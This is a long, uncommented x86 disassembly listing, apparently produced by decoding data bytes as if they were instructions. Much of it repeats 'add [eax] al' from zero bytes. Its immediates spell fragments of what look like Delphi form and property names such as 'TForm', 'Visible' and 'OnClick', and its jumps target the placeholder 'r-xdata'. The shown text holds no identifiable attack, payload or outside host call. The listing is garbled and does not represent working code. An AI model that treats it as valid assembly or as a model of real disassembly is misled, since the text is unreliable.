add [ eax ] ah
add [ esi ] sub_403128
inc esp
xor [ eax ] eax
sbb al 0x5d
inc esi
add [ eax - 0x73ffbabb ] ah
bound eax [ esi ]
test [ edx + 0x5edc0041 ] cl
inc esi
add [ eax ] bl
pop edi
inc esi
add [ eax ] ah
inc esi
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add [ eax + ebp * 2 + 0xbbc0046 ] bl
inc edx
add [ esp ] bh
inc esi
add [ ecx + ebx * 2 + 0x46 ] dh
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
jl r-xdata
add ah bl
add [ esi ] 0x24
push cs
inc ebp
add [ edx + edi - 0x782fffbb ] bl
inc esi
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add ah ah
pushfd
inc esi
add [ eax + 0x52 ] ch
inc esi
add [ eax ] bl
push ebp
inc esi
add ah al
lea eax [ esi ]
add [ esi + 0x46 ] bl
add [ esi + ebx * 2 + 0x46 ] bh
add ah al
mov al [ 0x5b380046 ]
inc esi
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] bl
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x70 ]
inc si
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax + ebp * 2 + 0x46 ] ah
add [ eax ] dh
inc esi
add [ eax ] ah
rol [ eax + eax - 0x24 ] cl
push 0xf4c80046
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add [ eax + ebx * 2 + 0x46 ] dh
add [ eax + 0x2800466f ] al
cmovne eax [ eax ]
inc esp
jl r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
[ eax + 0x10046a5 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
add al al
insd
inc ecx
add [ eax + eax ] bh
add dh bh
add ch al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
int3
inc esi
add al cl
fwait
inc esi
add [ eax + 0x7c004682 ] ch
popfd
inc esi
add [ eax + 0x68 ] ah
inc esi
add [ 0x726f4654 ] al
insd
mov eax eax
and al 0x30
inc esi
add [ edi ] al
add eax 0x726f4654
insd
and al 0x2f
inc esi
add [ esi + ebp + 0x5e0046 ] dh
add eax 0x6d726f46
jae r-xdata
pop ebx
add [ edi + edi * 2 + 0x7e600046 ] ah
inc esi
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ eax ] al
adc eax [ eax ]
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
lodsb [ esi ]
movsd [ edi ] [ esi ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
or al [ ecx + 0x75 ]
je r-xdata
daa
inc esi
add [ ecx ] ch
add al [ eax ]
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov al 0xd2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
sub [ esi ] eax
sub [ edx ] al
add bh bh
outsd
dec esp
jg r-xdata
pop eax
insb
les ecx [ gs : ebp + 0x16c0044 ]
add bh bh
test al 0x3b
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
add [ ecx ] ah
add bh bh
loopne r-xdata
popad
outsb
test al 0x1d
inc edx
add [ eax ] dh
add bh bh
sub al 0xd3
inc esp
add [ eax - 0x2d ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax + 0x430b001b ] al
insb
add [ eax ] al
jb r-xdata
call 0xffffffffd545328e
movsd [ edi ] [ esi ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
inc esi
imul ebp [ edi + 0x6e ] r-xdata
aam 0xcb
inc esp
add [ eax - 0x4fffb999 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax + 0x580044cb ] dl
jae r-xdata
arpl [ edi + 0x6e ] bp
jo r-xdata
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
add [ eax + 0x4664 ] dh
add [ eax ] al
add [ eax ] 0x0
inc esi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
mov ecx ss
inc esp
add [ ecx + edx * 8 + 0x74040044 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
or al 0x71
inc esi
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
inc esp
push ebx
inc esi
add al ch
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] eax
push cs
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
enter 0x453b 0x0
outsb
je r-xdata
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x1cff0001 ] ah
cmp eax 0x10045
sub [ esi ] eax
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
and [ eax ] al
add [ eax ] eax
add [ eax ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
popad
insb
jne r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
nop
jle r-xdata
jb r-xdata
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
or eax [ ebx + 0x6c ]
jae r-xdata
sbb eax 0x2ec0042
add bh bh
shl [ ebp + 0x10046 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
jle r-xdata
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
hlt
adc [ eax ] al
push eax
add [ eax ] al
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
in al dx
cmp eax [ ebp ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
inc eax
add [ ecx ] bl
add bh bh
mov eax 0x10044d2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
outsb
je r-xdata
dec ecx
imul ebp [ ebp - 0x80 ] 0x8004623
add al [ eax ]
inc [ eax ]
push esp
inc esi
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
cmp al 0x10
outsd
outsb
je r-xdata
inc ebp
add [ eax + 0x2 ] ah
add bh bh
xor [ ebp + 0x46 ] dh
jb r-xdata
add [ eax ] al
add [ eax ] al
push ebx
arpl [ edx + 0x6f ] si
insb
add bh bh
insb
leave
inc esp
add al al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
and al [ edx ]
push 0x80ff0000
rol [ eax + eax - 0x70 ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
js r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
jns r-xdata
sub al 0x42
add [ eax + 0x2 ] al
add bh bh
clc
jae r-xdata
add [ eax ] al
or [ ebx ] 0x0
or eax 0x7a726f48
sub [ esi ] al
das
add al [ eax ]
push [ esp + esi * 2 ]
inc esi
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
outsb
and al 0x2a
inc esi
outsb
arpl [ eax - 0x64 ] bp
enter 0x45 0x7c
add [ eax ] al
inc [ ecx + edx * 8 + 0x44 ]
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
jb r-xdata
inc eax
add [ eax + eax ] cl
[ ecx + ecx * 8 + 0x44 ]
cmp al 0x10
je r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
add [ esp + esi * 2 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
insb
inc edx
popad
push ebx
je r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
jb r-xdata
lds eax [ ebp ]
dec eax
add al [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
insb
inc eax
add [ edi + esi * 2 + 0x77c00046 ] dh
inc esi
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
push eax
ja r-xdata
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
rol [ ebp ] 0x60
add al [ eax ]
push [ eax ]
jne r-xdata
add [ eax + 0x77 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
adc [ eax ] al
xor al 0x2
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
xor al 0x0
add [ eax + 0x1 ] al
sub [ esi ] eax
xor [ edx ] al
add bh bh
cwde
ja r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push ebx
outsb
popad
jo r-xdata
outsd
add [ edi + esi * 2 + 0x46 ] ah
cmp al 0x10
inc eax
add [ esp + esi * 2 ] al
inc esi
ja r-xdata
add [ esp + esi * 2 ] al
inc esi
add [ edx + edx * 8 + 0x44 ] ah
add [ eax - 0x80000000 ] al
aaa
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
add [ esp + esi * 2 ] al
inc esi
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
dec [ eax - 0x37 ]
inc esp
add al al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jne r-xdata
add [ eax ] al
je r-xdata
sub eax [ edx ]
add bh bh
mov al 0x78
inc esi
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
and eax [ esi ]
or al 0x2
add bh bh
adc [ esi + eax * 2 ] dl
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
add al 0x74
jb r-xdata
push ecx
je r-xdata
outsb
inc ebx
dec edi
call 0x58467d2a
add al [ eax ]
call [ ebp + esi * 2 + 0x46 ]
add [ eax + 0x2 ] bl
add bh bh
push esp
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
je r-xdata
dec esp
xchg [ eax + eax - 0x38 ] al
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] 0xc
dec edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
nop
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
outsb
push edi
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc eax
add [ eax ] al
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
dec edi
mov al [ 0xffffffffb0004483 ]
add [ eax ] eax
push [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
inc [ esp + esi * 2 ]
push ecx
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
clc
sub al [ esi ]
cwde
add al [ eax ]
[ eax + 0x4ff0002 ]
je r-xdata
inc ebx
insb
outsd
jae r-xdata
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
fadd [ ebp + 0xc00044 ]
add bh bh
rol [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
pushfd
jb r-xdata
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
fadd [ edi + 0x1300044 ]
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
imul esi [ ebp + 0x49 ] 0x746f666e
push edi
outsb
outsw
je r-xdata
jo r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
test [ eax + eax - 0x48 ] al
add [ eax ] eax
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0049 ] al
jbe r-xdata
jns r-xdata
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
outsb
dec ebx
jns r-xdata
or [ edi ] 0x9
dec edi
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
add [ eax ] al
or [ edx ] 0xa
dec edi
outsb
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x50 ] bp
test [ eax + eax - 0x30 ] eax
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] ecx
jb r-xdata
call 0xffffffffe945397d
add [ eax ] al
inc [ esp + esi * 2 ]
inc esi
push edi
inc ecx
mov al [ 0x4ff0002 ]
je r-xdata
jo r-xdata
loopne r-xdata
jo r-xdata
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ esp + esi * 2 ]
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
outsb
dec eax
imul esp [ ebp + 0x78 ] 0xa800462b
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
inc esi
add [ eax + eax - 0x18 ] 0x0
add bh bh
call 0x5453981
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
add al [ eax ]
inc [ esp + esi * 2 ]
push edi
inc ecx
add al dl
add al [ eax ]
call eax
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add al 0x74
dec ebp
add [ esi ] al
dec edi
outsd
jne r-xdata
push ebp
jo r-xdata
insb
xchg [ fs : eax + eax + 0x40 ] eax
inc esp
outsd
ja r-xdata
cmp al 0x2b
inc esi
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
xchg [ fs : eax + eax + 0x48 ] eax
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
outsb
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
mov al 0x80
inc esp
add al ah
inc esi
fadd [ eax ]
jb r-xdata
push edi
push edi
push 0x556c6565
jo r-xdata
add [ eax + eax - 0x20 ] 0x0
add bh bh
xchg [ eax + eax + 0x38 ] al
add [ eax ] eax
jae r-xdata
push edi
add bh bh
fadd [ eax ]
add bh bh
add al 0x74
sub [ ecx + 0xd80044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x3e
je r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
pop edi
inc esi
add [ eax ] ah
inc esi
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add [ eax + ebp * 2 + 0xbbc0046 ] bl
inc edx
add [ esp ] bh
inc esi
add [ esi ] dl
inc esi
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
jl r-xdata
inc esi
add ah ch
xor eax [ eax ]
and [ ecx + 0x31280046 ] al
inc eax
add [ ecx + esi + 0x40 ] al
add [ ebx * 2 + 0x45a00046 ] bl
inc ebp
add [ edx - 0x757bffba ] cl
inc ecx
add [ eax + 0x180046a7 ] al
jb r-xdata
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0x8504776f
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
push edi
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
je r-xdata
jpe r-xdata
add ah bl
add [ esi ] 0x24
push cs
inc ebp
add [ edx + edi - 0x782fffbb ] bl
inc esi
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add ah ah
pushfd
inc esi
add [ eax + 0x52 ] ch
inc esi
add [ eax ] bl
push ebp
inc esi
add ah al
lea eax [ esi ]
add [ esi + 0x46 ] bl
add [ esi + ebx * 2 + 0x46 ] bh
add ah al
mov al [ 0x5b380046 ]
inc esi
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] bl
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x70 ]
inc si
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax + ebp * 2 + 0x46 ] ah
add [ eax ] dh
inc esi
add [ eax ] ah
rol [ eax + eax - 0x24 ] cl
push 0xf4c80046
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add [ eax + ebx * 2 + 0x46 ] dh
add [ eax + 0x2800466f ] al
cmovne eax [ eax ]
inc esp
jl r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffb9c3 ] bh
add [ eax - 0x80000000 ] al
pop ebp
add [ eax ] cl
dec edi
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
add [ eax ] al
jmp eax
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x5453aa3
je r-xdata
add [ eax - 0x73ffbabb ] ah
bound eax [ esi ]
test [ edx - 0x587fffbf ] cl
inc esi
add [ eax ] bl
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rol ah 0x3c
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi ] al
inc esp
cmp eax 0x2f80046
add [ eax ] al
aam 0x2b
inc esi
add ah al
push cs
inc edx
add [ eax ] al
pop ebx
inc esi
add [ esp + ebx * 2 + 0x33ec0046 ] dh
inc eax
add [ eax ] ah
add [ esi ] sub_403128
inc esp
xor [ eax ] eax
sbb al 0x5d
inc esi
mov eax 0xf000463d
outsd
arpl [ ebx - 0x68 ] bp
test [ eax + eax - 0x10 ] al
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
popad
inc esi
add al cl
fwait
inc esi
add [ eax + 0x7c004682 ] ch
popfd
inc esi
add [ eax + 0x68 ] ah
inc esi
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
pop ebx
add [ edi + edi * 2 + 0x7e600046 ] ah
inc esi
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070051 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
